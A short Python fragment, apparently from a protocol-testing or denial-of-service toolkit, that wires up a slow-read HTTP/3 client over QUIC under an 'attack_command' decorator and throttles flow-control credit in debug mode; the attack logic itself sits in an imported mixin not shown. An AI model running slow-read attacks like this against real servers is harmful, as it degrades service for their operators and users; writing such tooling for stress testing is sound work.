...
from utils_slow_read import SlowReadMaxDataMixin
...
class SlowReadHttpClient(SlowReadMaxDataMixin, HttpClient):
    pass


@attack_command()
@quic_connection_loop(alpn_protocols=H3_ALPN, create_protocol=SlowReadHttpClient)
async def main(addr, con: SlowReadHttpClient, debug=False, *args, **kwargs):
    if debug:
        con.max_data_increment = 10
